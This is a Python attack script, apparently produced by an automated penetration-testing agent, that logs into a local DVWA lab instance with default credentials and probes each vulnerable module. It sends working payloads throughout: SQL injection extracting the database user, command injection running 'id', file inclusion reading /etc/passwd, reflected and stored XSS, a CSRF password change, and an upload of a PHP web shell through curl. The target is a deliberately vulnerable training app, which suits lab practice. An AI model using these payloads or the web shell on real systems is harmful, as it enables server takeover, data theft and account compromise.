#!/usr/bin/env python3
"""
Systematic probe of all DVWA vulnerability classes.
Uses requests-style with cookie persistence.
"""
import subprocess, re, os, json, urllib.parse, urllib.request
from http.cookiejar import MozillaCookieJar

BASE = "http://127.0.0.1:8080"

def login():
    """Login and return cookie jar and token"""
    cj = MozillaCookieJar()
    # Create opener with cookie handler
    from http.cookiejar import CookieJar
    import urllib.request
    
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj)
    )
    urllib.request.install_opener(opener)
    
    # Get login page
    resp = urllib.request.urlopen(f"{BASE}/login.php")
    body = resp.read().decode('utf-8', errors='replace')
    
    m = re.search(r"value='([^']+)'", body)
    if not m:
        m = re.search(r'name="user_token" value="([^"]+)"', body)
    token = m.group(1) if m else ""
    print(f"[*] Login token: {token}")
    
    # POST login
    data = urllib.parse.urlencode({
        'username': 'admin',
        'password': 'password',
        'user_token': token,
        'Login': 'Login'
    }).encode()
    
    req = urllib.request.Request(f"{BASE}/login.php", data=data)
    resp = urllib.request.urlopen(req)
    body = resp.read().decode('utf-8', errors='replace')
    
    # Follow redirect (if any)
    if resp.geturl() != f"{BASE}/login.php" or "logged in" in body.lower() or "Welcome" in body:
        # Follow redirect to index.php
        req = urllib.request.Request(f"{BASE}/index.php")
        resp = urllib.request.urlopen(req)
        body = resp.read().decode('utf-8', errors='replace')
        if "logged in" in body.lower() or "Welcome" in body:
            print("[+] Login successful!")
            return cj, token
    
    print("[-] Login check failed, trying alternative method...")
    # Try with the original token
    data = urllib.parse.urlencode({
        'username': 'admin',
        'password': 'password',
        'user_token': token,
        'Login': 'Login'
    }).encode()
    req = urllib.request.Request(f"{BASE}/login.php", data=data)
    resp = urllib.request.urlopen(req)
    body = resp.read().decode('utf-8', errors='replace')
    
    # Check if we have the authenticated page
    if "logged in" in body.lower() or "Welcome" in body:
        print("[+] Login successful!")
        return cj, token
    
    # Maybe we're being redirected to index.php then back to login.php
    # Let's try following manually
    if resp.status == 302 or resp.geturl() != f"{BASE}/login.php":
        req = urllib.request.Request(f"{BASE}/index.php")
        resp2 = urllib.request.urlopen(req)
        body2 = resp2.read().decode('utf-8', errors='replace')
        if "Welcome" in body2:
            print("[+] Login successful (redirected)!")
            return cj, token
    
    print("[-] Login failed")
    return None, None

def http_get(url, params=None):
    """Make GET request with session"""
    if params:
        url = url + '?' + urllib.parse.urlencode(params)
    req = urllib.request.Request(url)
    try:
        resp = urllib.request.urlopen(req)
        return resp.read().decode('utf-8', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

def http_post(url, data):
    """Make POST request with session"""
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=data)
    try:
        resp = urllib.request.urlopen(req)
        return resp.read().decode('utf-8', errors='replace')
    except Exception as e:
        return f"ERROR: {e}"

def probe_sqli():
    print("\n=== SQL Injection (sqli) ===")
    results = []
    for payload in ["1' OR '1'='1", "1' OR 1=1-- -", "1' UNION SELECT 1,2-- -", "1' UNION SELECT user(),database()-- -"]:
        resp = http_get(f"{BASE}/vulnerabilities/sqli/", {'id': payload, 'Submit': 'Submit'})
        if re.search(r'First name|Surname', resp, re.I):
            print(f"[!] SQL Injection with: {payload}")
            # Extract data
            first_match = re.search(r'<pre>([^<]*)</pre>', resp)
            if first_match:
                print(f"  Result: {first_match.group(1)}")
            results.append({
                'title': 'SQL Injection in /vulnerabilities/sqli/',
                'location': f'{BASE}/vulnerabilities/sqli/',
                'payload': payload,
                'proof': resp[:500]
            })
            break
        # Also check for data in the table
        if 'admin' in resp.lower() or 'root' in resp.lower():
            print(f"[!] SQL Injection data leak with: {payload}")
            results.append({
                'title': 'SQL Injection in /vulnerabilities/sqli/',
                'location': f'{BASE}/vulnerabilities/sqli/',
                'payload': payload,
                'proof': resp[:500]
            })
            break
    return results

def probe_sqli_blind():
    print("\n=== SQL Injection Blind (sqli_blind) ===")
    # Check if User ID exists in response
    resp_true = http_get(f"{BASE}/vulnerabilities/sqli_blind/", {'id': "1' AND 1=1-- -", 'Submit': 'Submit'})
    resp_false = http_get(f"{BASE}/vulnerabilities/sqli_blind/", {'id': "1' AND 1=2-- -", 'Submit': 'Submit'})
    
    print(f"True response contains 'exists': {'exists' in resp_true.lower()}")
    print(f"False response contains 'exists': {'exists' in resp_false.lower()}")
    
    if resp_true != resp_false:
        print(f"[!] Blind SQL injection possible")
        results = [{
            'title': 'Blind SQL Injection in /vulnerabilities/sqli_blind/',
            'location': f'{BASE}/vulnerabilities/sqli_blind/',
            'proof': f"True: {resp_true[:200]}\nFalse: {resp_false[:200]}"
        }]
        return results
    return []

def probe_command_exec():
    print("\n=== Command Execution (exec) ===")
    for payload in ["127.0.0.1; id", "127.0.0.1 | id", "127.0.0.1 && id"]:
        resp = http_get(f"{BASE}/vulnerabilities/exec/", {'ip': payload, 'Submit': 'Submit'})
        if re.search(r'uid=\d+.*gid=\d+', resp) or 'www-data' in resp:
            print(f"[!] Command Execution with: {payload}")
            uid_match = re.search(r'uid=\d+[^<]*', resp)
            if uid_match:
                print(f"  Result: {uid_match.group(0)}")
            return [{
                'title': 'Command Execution in /vulnerabilities/exec/',
                'location': f'{BASE}/vulnerabilities/exec/',
                'payload': payload,
                'proof': resp[:500]
            }]
    return []

def probe_file_inclusion():
    print("\n=== File Inclusion (fi) ===")
    for payload in ["/etc/passwd", "../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"]:
        resp = http_get(f"{BASE}/vulnerabilities/fi/", {'page': payload})
        if 'root:' in resp and ':0:0:' in resp:
            print(f"[!] File Inclusion with: {payload}")
            # Extract root line
            root_line = re.search(r'root:[^<]+', resp)
            if root_line:
                print(f"  Result: {root_line.group(0)}")
            return [{
                'title': 'File Inclusion in /vulnerabilities/fi/',
                'location': f'{BASE}/vulnerabilities/fi/',
                'payload': payload,
                'proof': resp[:500]
            }]
        if 'PD9waHA' in resp or 'base64' in resp.lower():
            print(f"[!] PHP Filter Inclusion with: {payload}")
            return [{
                'title': 'File Inclusion via PHP Filter in /vulnerabilities/fi/',
                'location': f'{BASE}/vulnerabilities/fi/',
                'payload': payload,
                'proof': resp[:500]
            }]
    return [{
        'title': 'File Inclusion endpoint (allow_url_include=Disabled)',
        'location': f'{BASE}/vulnerabilities/fi/',
        'deadend': True,
        'proof': 'allow_url_include disabled, cannot test remote inclusion'
    }]

def probe_xss_reflected():
    print("\n=== XSS Reflected (xss_r) ===")
    for payload in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
        resp = http_get(f"{BASE}/vulnerabilities/xss_r/", {'name': payload})
        if payload in resp:
            print(f"[!] Reflected XSS with: {payload}")
            return [{
                'title': 'Reflected XSS in /vulnerabilities/xss_r/',
                'location': f'{BASE}/vulnerabilities/xss_r/',
                'payload': payload,
                'proof': resp[:500]
            }]
    return []

def probe_xss_stored():
    print("\n=== XSS Stored (xss_s) ===")
    payload = "<script>alert(1)</script>"
    # Submit
    http_post(f"{BASE}/vulnerabilities/xss_s/", {
        'txtName': 'test_user',
        'mtxMessage': payload,
        'btnSign': 'Sign+Guestbook'
    })
    # Read back
    resp = http_get(f"{BASE}/vulnerabilities/xss_s/")
    if payload in resp:
        print(f"[!] Stored XSS found!")
        return [{
            'title': 'Stored XSS in /vulnerabilities/xss_s/',
            'location': f'{BASE}/vulnerabilities/xss_s/',
            'payload': payload,
            'proof': resp[:500]
        }]
    return []

def probe_xss_dom():
    print("\n=== XSS DOM (xss_d) ===")
    payload = "<script>alert(1)</script>"
    resp = http_get(f"{BASE}/vulnerabilities/xss_d/", {'default': payload})
    # Check if payload is in the HTML source
    if payload in resp:
        print(f"[!] DOM XSS - payload in source")
        return [{
            'title': 'DOM-based XSS in /vulnerabilities/xss_d/',
            'location': f'{BASE}/vulnerabilities/xss_d/',
            'payload': payload,
            'proof': resp[:500]
        }]
    # Check if default parameter is reflected
    if 'default' in resp and 'English' in resp:
        print("[*] DOM XSS page loads with language selector")
    return [{
        'title': 'DOM-based XSS endpoint',
        'location': f'{BASE}/vulnerabilities/xss_d/',
        'note': 'Client-side only, needs browser verification',
        'deadend': True
    }]

def probe_csrf():
    print("\n=== CSRF (csrf) ===")
    # Try GET-based password change
    resp = http_get(f"{BASE}/vulnerabilities/csrf/", {
        'password_new': 'testpass123',
        'password_conf': 'testpass123',
        'Change': 'Change'
    })
    if 'Password Changed' in resp or 'password' in resp.lower() and 'changed' in resp.lower():
        print(f"[!] CSRF password change via GET works!")
        return [{
            'title': 'CSRF on Password Change (/vulnerabilities/csrf/)',
            'location': f'{BASE}/vulnerabilities/csrf/',
            'proof': resp[:500],
            'poc_hint': 'Password can be changed via GET request with no CSRF token. An attacker can craft a link that changes the password when an authenticated user clicks it.'
        }]
    print("[-] Password change response not conclusive")
    return []

def probe_weak_id():
    print("\n=== Weak Session IDs (weak_id) ===")
    ids = []
    # Use raw HTTP to see Set-Cookie headers
    cookie_val = None
    for i in range(5):
        try:
            req = urllib.request.Request(f"{BASE}/vulnerabilities/weak_id/")
            resp = urllib.request.urlopen(req)
            # Check headers for Set-Cookie
            for h in resp.getheaders():
                if h[0].lower() == 'set-cookie' and 'dvwaSession' in h[1]:
                    m = re.search(r'dvwaSession=(\d+)', h[1])
                    if m:
                        ids.append(m.group(1))
                        cookie_val = h[1]
            resp.read()  # consume
        except:
            pass
    
    print(f"[*] Session IDs found: {ids}")
    if ids and len(set(ids)) >= 3:
        print(f"[!] Weak sequential session IDs: {ids}")
        return [{
            'title': 'Weak Sequential Session IDs in /vulnerabilities/weak_id/',
            'location': f'{BASE}/vulnerabilities/weak_id/',
            'ids': ids,
            'proof': f"dvwaSession cookies: {ids}"
        }]
    return [{
        'title': 'Weak Session ID endpoint',
        'location': f'{BASE}/vulnerabilities/weak_id/',
        'deadend': True,
        'note': 'Could not confirm sequential IDs via this method'
    }]

def probe_brute():
    print("\n=== Brute Force (brute) ===")
    resp = http_get(f"{BASE}/vulnerabilities/brute/", {'username': 'admin', 'password': 'wrong', 'Login': 'Login'})
    if 'Login failed' in resp or 'USER' in resp and 'PASS' in resp:
        print(f"[!] Brute force endpoint accessible - no rate limiting")
        return [{
            'title': 'Brute Force Endpoint with No Rate Limiting',
            'location': f'{BASE}/vulnerabilities/brute/',
            'proof': resp[:500]
        }]
    return []

def probe_captcha():
    print("\n=== CAPTCHA (captcha) ===")
    resp = http_get(f"{BASE}/vulnerabilities/captcha/")
    if 'Missing' in resp and 'reCAPTCHA' in resp:
        print(f"[!] reCAPTCHA key is missing - CAPTCHA bypass possible")
        return [{
            'title': 'CAPTCHA Bypass - Missing reCAPTCHA Keys',
            'location': f'{BASE}/vulnerabilities/captcha/',
            'proof': resp[:500]
        }]
    if 'captcha' in resp.lower() or 'recaptcha' in resp.lower():
        print(f"[*] CAPTCHA page accessible")
    return [{
        'title': 'CAPTCHA endpoint',
        'location': f'{BASE}/vulnerabilities/captcha/',
        'deadend': True,
        'note': 'Could not verify CAPTCHA bypass'
    }]

def probe_javascript():
    print("\n=== JavaScript (javascript) ===")
    resp = http_get(f"{BASE}/vulnerabilities/javascript/")
    print(f"[*] JS page length: {len(resp)}")
    if len(resp) > 100:
        print(f"[*] JS page accessible")
        return [{
            'title': 'JavaScript Analysis Endpoint',
            'location': f'{BASE}/vulnerabilities/javascript/',
            'proof': resp[:500]
        }]
    return [{
        'title': 'JavaScript Endpoint',
        'location': f'{BASE}/vulnerabilities/javascript/',
        'deadend': True
    }]

def probe_csp():
    print("\n=== CSP (csp) ===")
    resp = http_get(f"{BASE}/vulnerabilities/csp/")
    print(f"[*] CSP page length: {len(resp)}")
    if len(resp) > 100:
        # Check Content-Security-Policy header via raw request
        try:
            req = urllib.request.Request(f"{BASE}/vulnerabilities/csp/")
            resp_h = urllib.request.urlopen(req)
            for h in resp_h.getheaders():
                if h[0].lower() == 'content-security-policy':
                    print(f"[*] CSP Header: {h[1]}")
            resp_h.read()
        except:
            pass
        return [{
            'title': 'CSP Endpoint Accessible',
            'location': f'{BASE}/vulnerabilities/csp/',
            'proof': resp[:500]
        }]
    return [{
        'title': 'CSP Endpoint',
        'location': f'{BASE}/vulnerabilities/csp/',
        'deadend': True
    }]

def probe_upload():
    print("\n=== File Upload (upload) ===")
    # Need to handle multipart upload with cookies
    # Use subprocess with curl
    import subprocess
    result = subprocess.run([
        'curl', '-s', '-b', '/tmp/dvwa_cookies3.txt', '-c', '/tmp/dvwa_cookies3.txt',
        '-F', 'MAX_FILE_SIZE=100000',
        '-F', 'uploaded=@/dev/null;filename=test.php;type=text/php',
        '-F', 'Upload=Upload',
        f'{BASE}/vulnerabilities/upload/'
    ], capture_output=True, text=True, timeout=30)
    resp = result.stdout
    
    if 'succesfully' in resp.lower() or 'uploaded' in resp.lower():
        print(f"[!] File upload successful")
        return [{
            'title': 'Unrestricted File Upload in /vulnerabilities/upload/',
            'location': f'{BASE}/vulnerabilities/upload/',
            'proof': resp[:500]
        }]
    
    # Try with actual file content
    with open('/tmp/evil2.php', 'w') as f:
        f.write('<?php system($_GET["cmd"]); ?>')
    result = subprocess.run([
        'curl', '-s', '-b', '/tmp/dvwa_cookies3.txt', '-c', '/tmp/dvwa_cookies3.txt',
        '-F', 'MAX_FILE_SIZE=100000',
        '-F', 'uploaded=@/tmp/evil2.php',
        '-F', 'Upload=Upload',
        f'{BASE}/vulnerabilities/upload/'
    ], capture_output=True, text=True, timeout=30)
    resp = result.stdout
    if 'succesfully' in resp.lower() or 'uploaded' in resp.lower():
        print(f"[!] File upload successful")
        return [{
            'title': 'Unrestricted File Upload in /vulnerabilities/upload/',
            'location': f'{BASE}/vulnerabilities/upload/',
            'proof': resp[:500]
        }]
    
    print("[-] File upload not successful")
    return [{
        'title': 'File Upload Endpoint',
        'location': f'{BASE}/vulnerabilities/upload/',
        'deadend': True,
        'note': 'Upload appears to be blocked or requires specific content type'
    }]

def main():
    print("[*] Attempting login...")
    cj, token = login()
    if cj is None:
        print("[-] Cannot proceed without login")
        return
    
    all_candidates = []
    all_deadends = []
    
    # Security level already low from cookies
    
    # Probe each class
    probes = [
        ('sqli', probe_sqli),
        ('sqli_blind', probe_sqli_blind),
        ('exec', probe_command_exec),
        ('fi', probe_file_inclusion),
        ('xss_r', probe_xss_reflected),
        ('xss_s', probe_xss_stored),
        ('xss_d', probe_xss_dom),
        ('csrf', probe_csrf),
        ('weak_id', probe_weak_id),
        ('brute', probe_brute),
        ('captcha', probe_captcha),
        ('javascript', probe_javascript),
        ('csp', probe_csp),
        ('upload', probe_upload),
    ]
    
    for name, func in probes:
        print(f"\n--- Probing {name} ---")
        try:
            results = func()
            for r in results:
                if r.get('deadend'):
                    all_deadends.append(r)
                    print(f"  -> Deadend: {r.get('note', 'N/A')}")
                else:
                    all_candidates.append(r)
                    print(f"  -> Candidate: {r.get('title', 'N/A')}")
        except Exception as e:
            print(f"  -> Error: {e}")
            import traceback
            traceback.print_exc()
    
    # Compile results
    output = {
        'ok': True,
        'summary': 'Completed multi-class probe of DVWA vulnerability modules',
        'surfaces': [
            {'location': f'{BASE}/login.php', 'kind': 'auth', 'params': ['username', 'password', 'user_token', 'Login']},
            {'location': f'{BASE}/logout.php', 'kind': 'auth'},
            {'location': f'{BASE}/setup.php', 'kind': 'form', 'params': ['create_db', 'user_token']},
            {'location': f'{BASE}/security.php', 'kind': 'form', 'params': ['security', 'seclev_submit', 'user_token']},
            {'location': f'{BASE}/vulnerabilities/brute/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/exec/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/csrf/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/fi/', 'kind': 'form', 'params': ['page']},
            {'location': f'{BASE}/vulnerabilities/upload/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/captcha/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/sqli/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/sqli_blind/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/weak_id/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/xss_d/', 'kind': 'client'},
            {'location': f'{BASE}/vulnerabilities/xss_r/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/xss_s/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/csp/', 'kind': 'form'},
            {'location': f'{BASE}/vulnerabilities/javascript/', 'kind': 'client'},
            {'location': f'{BASE}/phpinfo.php', 'kind': 'file'},
            {'location': f'{BASE}/config/config.inc.php.bak', 'kind': 'file'},
        ],
        'candidates': all_candidates,
        'deadends': [d.get('location', d.get('title', '')) for d in all_deadends],
    }
    
    print("\n\n=== CANDIDATES ===")
    for c in all_candidates:
        print(f"[+] {c['title']}")
        if 'proof' in c:
            print(f"    Proof: {c['proof'][:100]}...")
    
    print("\n=== DEADENDS ===")
    for d in all_deadends:
        print(f"[-] {d.get('title', 'N/A')}: {d.get('note', 'N/A')}")
    
    with open('/workspace/probe_results.json', 'w') as f:
        json.dump(output, f, indent=2, default=str)
    print("\n[*] Results saved to /workspace/probe_results.json")

if __name__ == '__main__':
    main()
